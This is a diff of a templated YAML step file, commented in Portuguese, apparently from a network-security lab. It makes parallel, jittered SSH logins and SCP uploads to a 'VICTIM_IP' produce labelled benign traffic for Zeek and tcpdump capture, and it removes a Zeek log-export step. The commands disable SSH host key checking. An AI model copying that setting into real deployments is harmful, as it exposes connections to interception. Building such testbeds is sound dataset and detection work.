+      SSH_N=$(( {benign3_ssh_repeats} * SCALE ))
+      SCP_N=$(( {benign3_scp_repeats} * SCALE ))
+
+      SSH_TMO="{benign3_ssh_timeout_s}"
+      SCP_TMO="{benign3_scp_timeout_s}"
+
+      jitter_ms() {
+        local min="{benign3_jitter_min_ms}" max="{benign3_jitter_max_ms}" r span ms s rem
+        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
+        span=$((max-min+1)); ms=$(( (r % span) + min ))
+        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
         sleep "${s}.$(printf '%03d' "$rem")"
       }
-        
-      # prepara arquivo pequeno
+
+      run_many(){
+        local count="$1" func="$2"
+        local running=0 i
+        for ((i=1; i<=count; i++)); do
+          "$func" &
+          ((running++))
+          if (( running >= PARALLEL )); then
+            if ! wait -n 2>/dev/null; then
+              for p in $(jobs -p); do wait "$p" && break || true; done
+            fi
+            ((running--))
+          fi
+        done
+        wait || true
+      }
+
+      do_ssh(){
+        timeout "$SSH_TMO" ssh -i "{ssh_key_path}" \
+          -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
+          "{ssh_user}@${VICTIM_IP}" 'true' >/dev/null 2>&1 || true
+        jitter_ms
+      }
+
+      do_scp(){
+        timeout "$SCP_TMO" scp -i "{ssh_key_path}" \
+          -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
+          "{scp_src_file}" "{ssh_user}@${VICTIM_IP}":"{scp_dst_dir}" >/dev/null 2>&1 || true
+        jitter_ms
+      }
+
+      # prepara arquivo pequeno (uma vez)
       echo "hello benign traffic $(date +%s)" > "{scp_src_file}"
-      
-      # SSH banners (repeats_small)
-      for i in $(seq 1 "{repeats_small}"); do
-      echo "[SSH] login benigno ${i}/{repeats_small} em ${VICTIM_IP}"
-      timeout 8 ssh -i "{ssh_key_path}" \
-      -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
-      "{ssh_user}@${VICTIM_IP}" 'echo "[SSH] ok no servidor $(hostname)"' >/dev/null 2>&1 || true
-      jitter
-      done
-      
-      # SCP pequenos (repeats_medium)
-      for i in $(seq 1 "{repeats_medium}"); do
-      echo "[SCP] envio ${i}/{repeats_medium} para ${VICTIM_IP}"
-      timeout 10 scp -i "{ssh_key_path}" \
-      -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
-      "{scp_src_file}" "{ssh_user}@${VICTIM_IP}": "{scp_dst_dir}" >/dev/null 2>&1 || true
-      jitter
-      done
+
+      # Execução conforme parâmetros
+      run_many "$SSH_N" do_ssh
+      run_many "$SCP_N" do_scp
 
   - id: sensor_capture_stop
     title: "Sensor | Parar captura e calcular hash"
@@ -896,82 +864,3 @@ steps:
       echo "[validate] packets=$PKTS file=$(ls -lh "$PCAP" | awk '{print $5}')" | tee -a "$LOG"
       tcpdump -r "$PCAP" -nn -c 5 2>/dev/null | tee -a "$LOG"
 
-  - id: sensor_export_conn
-    title: Exportar conn.log para o HOST
-    description: Copia logs do Zeek do último processamento (zeek_out_*) para /vagrant/data/zeek no HOST.
-    host: sensor
-    timeout: 90
-    sudo: true
-    sudo_mode: noninteractive
-    tags: [ zeek, export, etl ]
-    script: |
-      set -Eeuo pipefail
-      TS="$(date +%Y%m%d_%H%M%S)"
-      DEST="/vagrant/data/zeek"
-      CAP_DIR="/vagrant/data/captures"
-      mkdir -p "$DEST"
-
-      # 1) Tenta usar o TS da última captura/zeek (gravado pelos steps anteriores)
-      LAST_TS=""
-      if [ -f "$CAP_DIR/.last_ts" ]; then
-        LAST_TS="$(cat "$CAP_DIR/.last_ts" | tr -d '\r\n' || true)"
-      fi
-
-      SRC_DIR=""
-      if [ -n "$LAST_TS" ] && [ -d "$CAP_DIR/zeek_out_${LAST_TS}" ]; then
-        SRC_DIR="$CAP_DIR/zeek_out_${LAST_TS}"
-      fi
-
-      # 2) Se não achou via .last_ts, usa o zeek_out_* mais recente
-      if [ -z "$SRC_DIR" ]; then
-        CAND="$(ls -dt "$CAP_DIR"/zeek_out_* 2>/dev/null | head -n1 || true)"
-        if [ -n "$CAND" ] && [ -d "$CAND" ]; then
-          SRC_DIR="$CAND"
-          LAST_TS="$(basename "$CAND" | sed 's/^zeek_out_//')"
-        fi
-      fi
-
-      # 3) Diagnóstico e fallback para diretórios "current" do Zeek (instalação padrão)
-      if [ -n "$SRC_DIR" ] && ls -1 "$SRC_DIR"/*.log >/dev/null 2>&1; then
-        echo "[pull_conn] Usando diretório (zeek_out): $SRC_DIR"
-      else
-        echo "[pull_conn] zeek_out_* não encontrado/sem logs; usando fallback dos diretórios padrão do Zeek."
-        SRC_DIR=""
-        for d in "/opt/zeek/logs/current" "/usr/local/zeek/logs/current" "/var/log/zeek/current"; do
-          if [ -d "$d" ] && ls -1 "$d"/*.log >/dev/null 2>&1; then
-            SRC_DIR="$d"
-            break
-          fi
-        done
-        if [ -z "$SRC_DIR" ]; then
-          alt="$(find /opt/zeek/logs /usr/local/zeek/logs /var/log/zeek -type f -name 'conn.log' 2>/dev/null | head -n1 || true)"
-          if [ -n "$alt" ]; then
-            SRC_DIR="$(dirname "$alt")"
-          fi
-        fi
-        if [ -z "$SRC_DIR" ]; then
-          echo "[pull_conn] Nenhum diretório de logs do Zeek encontrado."
-          exit 2
-        fi
-      fi
-
-      # 4) Copia os logs para /vagrant/data/zeek com prefixo de timestamp
-      TS_OUT="${LAST_TS:-$TS}"
-      count=0
-      for f in "$SRC_DIR"/*.log; do
-        [ -f "$f" ] || continue
-        base="$(basename "$f")"
-        cp -f "$f" "$DEST/${TS_OUT}_${base}"
-        count=$((count+1))
-      done
-
-      if [ "$count" -eq 0 ]; then
-        echo "[pull_conn] Nenhum *.log encontrado em $SRC_DIR"
-        exit 3
-      fi
-
-      cd "$DEST"
-      sha256sum "${TS_OUT}_"*.log 2>/dev/null || true
-      [ -f "conn_${TS_OUT}.log" ] && sha256sum "conn_${TS_OUT}.log" || true
-      echo "[pull_conn] $count arquivo(s) copiado(s) para $DEST"
-  
